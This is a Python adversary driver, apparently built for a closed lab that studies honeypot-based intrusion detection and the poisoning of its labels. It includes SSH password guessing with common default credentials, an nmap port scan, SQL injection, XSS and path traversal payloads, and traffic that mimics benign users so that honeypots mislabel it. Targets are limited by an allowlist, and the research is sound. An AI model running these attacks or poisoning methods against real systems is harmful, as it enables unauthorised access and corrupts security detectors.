"""Adversary driver for the Phase B lab. Subcommands:

  mimic     real benign-shaped sessions aimed at the honeypots. Reads a benign
            profile (tools/learn_profile.py, learned from the lab's own capture)
            and reproduces its session shapes with real HTTP/SSH clients. These
            cost the attacker normal traffic yet get auto-labelled malicious —
            the A1 channel, end to end. intent="poison".
  ssh-guess slow, seeded password guessing from a tiny list (a handful of tries).
  portscan  a TCP connect scan of a small port list (nmap -sT).
  webprobe  a few canned SQLi/XSS-style query strings. The honeypot logs and
            ignores them; nothing is executed. intent="attack".

Every routine validates its target against the allowlist first (lib/allowlist).
All randomness is seeded by LAB_SEED, so a scenario reproduces."""
from __future__ import annotations

import argparse
import json
import os
import random
import subprocess
import time
from pathlib import Path

import paramiko
import requests

from lib.allowlist import require_allowed
from lib.gt import GroundTruth

SEED = int(os.environ.get("LAB_SEED", "1"))
GT = GroundTruth(os.environ.get("GROUND_TRUTH", "/data/logs/ground_truth/attacker.jsonl"))
# Honeypot targets are env-configurable so the same image drives condition L
# (Cowrie :2222 / Flask :21) and condition H (prod-identical :22 / :80), §33.
HTTP_HONEYPOT = os.environ.get("HTTP_HONEYPOT", "172.28.0.21")
_SSH_HP_IP = os.environ.get("SSH_HONEYPOT", "172.28.0.20")
_SSH_HP_PORT = int(os.environ.get("SSH_HONEYPOT_PORT", "2222"))
SSH_HONEYPOT = (_SSH_HP_IP, _SSH_HP_PORT)
PROD_IP = "172.28.0.10"

# Decoy site paths the mimic can request (same pages prod-web/the honeypot serve).
SITE_PATHS = ["/", "/about.html", "/docs.html", "/status.html", "/contact.html",
              "/assets/style.css", "/assets/app.js", "/assets/logo.svg", "/assets/manual.txt"]


# --------------------------------------------------------------------------- #
# (a) mimic — the A1 channel                                                  #
# --------------------------------------------------------------------------- #
def _load_profile(path: str) -> dict:
    p = Path(path)
    if not p.is_file():
        # Fallback shape if no profile has been learned yet: modest sessions.
        return {"web": {"requests_per_session": [2, 3, 4, 5], "think_times": [0.5, 1.0, 2.0]},
                "inter_arrival": [1.0, 2.0, 3.0]}
    return json.loads(p.read_text())


def mimic(args: argparse.Namespace) -> int:
    """Profile-based mimic (strategies (i) profile and (iii) oracle: same code,
    different --profile source). Each request a fresh connection so one flow per
    request, matching the dense benign capture. --tag sets the ground-truth kind
    so build_lab can tell the strategies apart."""
    prof = _load_profile(args.profile)
    rng = random.Random(SEED)
    base = f"http://{require_allowed(HTTP_HONEYPOT)}"
    web = prof.get("web", {})
    rps = web.get("requests_per_session") or [3]
    inter = prof.get("inter_arrival") or [1.5]

    n = 0
    deadline = time.time() + args.seconds
    while time.time() < deadline and (args.sessions == 0 or n < args.sessions):
        t0 = time.time()
        n_req, n_bytes = 0, 0
        k = max(1, int(rng.choice(rps)))
        for _ in range(k):
            path = rng.choice(SITE_PATHS)
            try:
                r = requests.get(base + path, timeout=5,
                                 headers={"User-Agent": "Mozilla/5.0 AcmeBrowse/1.0",
                                          "Connection": "close"})
                n_req += 1; n_bytes += len(r.content)
            except requests.RequestException:
                pass
        GT.log(dst=HTTP_HONEYPOT, dst_port=80, intent="poison", kind=args.tag,
               t_start=t0, t_end=time.time(), requests=n_req, bytes=n_bytes)
        n += 1
        time.sleep(min(float(rng.choice(inter)), 1.0))
    print(f"mimic[{args.tag}]: {n} sessions -> {HTTP_HONEYPOT}", flush=True)
    return 0


def benign(args: argparse.Namespace) -> int:
    """The attacker's OWN benign browsing of prod, logged intent=benign,
    kind=attacker_benign. Strategy (i)'s profile is learned from this capture
    (separate from the defender's benign data). Fresh connection per request."""
    base = f"http://{require_allowed(PROD_IP)}"
    rng = random.Random(SEED + 41)
    n = 0
    deadline = time.time() + args.seconds
    while time.time() < deadline:
        t0 = time.time(); nr = 0; nb = 0
        for path in rng.sample(SITE_PATHS, rng.randint(2, len(SITE_PATHS))):
            try:
                r = requests.get(base + path, timeout=5,
                                 headers={"User-Agent": "Mozilla/5.0 AcmeBrowse/1.0",
                                          "Connection": "close"})
                nr += 1; nb += len(r.content)
            except requests.RequestException:
                pass
        # kind="web" so learn_profile picks these up (they live in the attacker's
        # own ground-truth file, separate from the defender's benign capture).
        GT.log(dst=PROD_IP, dst_port=80, intent="benign", kind="web",
               t_start=t0, t_end=time.time(), requests=nr, bytes=nb)
        n += 1
        time.sleep(rng.uniform(0.0, 0.3))
    print(f"benign(attacker): {n} sessions -> prod", flush=True)
    return 0


def replay(args: argparse.Namespace) -> int:
    """Strategy (ii) replay: the attacker performs concrete benign sessions against
    prod (recording the exact path sequence it used), then re-issues the identical
    sequence to the honeypot. The prod leg is logged benign; the honeypot leg poison
    (kind=mimic_replay). Each request a fresh connection."""
    prod = f"http://{require_allowed('172.28.0.10')}"
    hp = f"http://{require_allowed(HTTP_HONEYPOT)}"
    rng = random.Random(SEED + 23)
    n = 0
    deadline = time.time() + args.seconds
    while time.time() < deadline and (args.sessions == 0 or n < args.sessions):
        k = rng.randint(2, len(SITE_PATHS))
        seq = [rng.choice(SITE_PATHS) for _ in range(k)]  # the concrete sequence
        # perform it against prod (real benign session), then replay to the honeypot
        for dst, base, intent, kind in ((PROD_IP, prod, "benign", "replay_record"),
                                        (HTTP_HONEYPOT, hp, "poison", "mimic_replay")):
            t0 = time.time(); nb = 0; nr = 0
            for path in seq:
                try:
                    r = requests.get(base + path, timeout=5,
                                     headers={"User-Agent": "Mozilla/5.0 AcmeBrowse/1.0",
                                              "Connection": "close"})
                    nr += 1; nb += len(r.content)
                except requests.RequestException:
                    pass
            GT.log(dst=dst, dst_port=80, intent=intent, kind=kind,
                   t_start=t0, t_end=time.time(), requests=nr, bytes=nb)
        n += 1
        time.sleep(rng.uniform(0.0, 0.3))
    print(f"replay: {n} sessions (prod then honeypot)", flush=True)
    return 0


# --------------------------------------------------------------------------- #
# (b) small real attacks                                                      #
# --------------------------------------------------------------------------- #
GUESS_USERS = ["root", "admin"]
GUESS_PASSWORDS = ["123456", "password", "root", "admin", "letmein", "toor"]


def ssh_guess(args: argparse.Namespace) -> int:
    host, port = SSH_HONEYPOT if args.target == "honeypot" else (require_allowed("172.28.0.11"), 22)
    require_allowed(host)
    rng = random.Random(SEED + 7)
    # Generate up to --attempts credential pairs (cycle a widened space so large
    # attempt counts are possible, §33 needs enough attack flows for usable TPR).
    users = GUESS_USERS + [f"user{i}" for i in range(50)]
    pws = GUESS_PASSWORDS + [f"pass{i:04d}" for i in range(400)]
    tries = [(u, p) for u in users for p in pws]
    rng.shuffle(tries)
    tries = tries[: args.attempts]
    t0 = time.time(); ok = 0
    for user, pw in tries:
        cli = paramiko.SSHClient()
        cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            cli.connect(host, port=port, username=user, password=pw,
                        timeout=5, allow_agent=False, look_for_keys=False, banner_timeout=5)
            ok += 1
        except Exception:
            pass
        finally:
            cli.close()
        time.sleep(args.delay)  # slow: spaced attempts, not a flood
    GT.log(dst=host, dst_port=port, intent="attack", kind="ssh_bruteforce",
           t_start=t0, t_end=time.time(), attempts=len(tries), accepted=ok)
    print(f"ssh-guess: {len(tries)} attempts -> {host}:{port}", flush=True)
    return 0


def portscan(args: argparse.Namespace) -> int:
    host = require_allowed(args.host)
    ports = args.ports
    t0 = time.time()
    # -sT connect scan, -Pn skip host discovery, -n no DNS. A small fixed port set.
    proc = subprocess.run(["nmap", "-sT", "-Pn", "-n", "-p", ports, host],
                          capture_output=True, text=True, timeout=120)
    GT.log(dst=host, dst_port=0, intent="attack", kind="portscan",
           t_start=t0, t_end=time.time(), ports=ports)
    print(proc.stdout.strip()[-400:], flush=True)
    return 0


WEB_PROBES = [
    "/?q=1' OR '1'='1",
    "/?id=1 UNION SELECT username,password FROM users--",
    "/search?q=<script>alert(1)</script>",
    "/contact.html?q=\"><img src=x onerror=alert(1)>",
    "/../../etc/passwd",
]


def webprobe(args: argparse.Namespace) -> int:
    host = require_allowed(args.host)
    base = f"http://{host}"
    rng = random.Random(SEED + 11)
    t0 = time.time(); n = 0
    for _ in range(args.count):
        probes = WEB_PROBES[:]
        rng.shuffle(probes)
        for path in probes:
            try:
                requests.get(base + path, timeout=5,
                             headers={"User-Agent": "sqlmap/1.8-probe", "Connection": "close"})
                n += 1
            except requests.RequestException:
                pass
            time.sleep(args.delay)
    GT.log(dst=host, dst_port=80, intent="attack", kind="web_probe",
           t_start=t0, t_end=time.time(), probes=n)
    print(f"webprobe: {n} probes -> {host}", flush=True)
    return 0


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    sub = ap.add_subparsers(dest="cmd", required=True)

    m = sub.add_parser("mimic"); m.set_defaults(fn=mimic)
    m.add_argument("--profile", default=os.environ.get("PROFILE", "/profiles/benign_profile.json"))
    m.add_argument("--seconds", type=float, default=300.0)
    m.add_argument("--sessions", type=int, default=0, help="0 = until --seconds elapses")
    m.add_argument("--tag", default="mimic_profile", help="ground-truth kind (strategy label)")

    rp = sub.add_parser("replay"); rp.set_defaults(fn=replay)
    rp.add_argument("--seconds", type=float, default=300.0)
    rp.add_argument("--sessions", type=int, default=0, help="0 = until --seconds elapses")

    bn = sub.add_parser("benign"); bn.set_defaults(fn=benign)
    bn.add_argument("--seconds", type=float, default=120.0)

    g = sub.add_parser("ssh-guess"); g.set_defaults(fn=ssh_guess)
    g.add_argument("--target", choices=["honeypot", "prod"], default="honeypot")
    g.add_argument("--attempts", type=int, default=12)
    g.add_argument("--delay", type=float, default=2.0)

    s = sub.add_parser("portscan"); s.set_defaults(fn=portscan)
    s.add_argument("--host", default="172.28.0.21")
    s.add_argument("--ports", default="1-1000")   # §33: many ports -> many flows

    w = sub.add_parser("webprobe"); w.set_defaults(fn=webprobe)
    w.add_argument("--host", default="172.28.0.21")
    w.add_argument("--delay", type=float, default=1.0)
    w.add_argument("--count", type=int, default=1, help="repeat the probe set N times")

    args = ap.parse_args(argv)
    return args.fn(args)


if __name__ == "__main__":
    raise SystemExit(main())
